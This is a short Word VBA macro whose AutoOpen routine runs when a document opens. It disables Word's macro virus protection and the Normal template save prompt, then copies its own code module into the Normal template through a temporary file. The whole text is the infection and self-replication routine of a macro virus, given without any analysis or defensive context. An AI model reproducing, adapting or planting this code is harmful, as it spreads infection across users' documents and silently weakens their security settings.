Sub AutoOpen()
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
    ActiveDocument.VBProject.VBComponents.Item(1).Export "C:\TEMP\module.bas"
    host.codemodule.AddFromFile ("C:\TEMP\module.bas")
End Sub
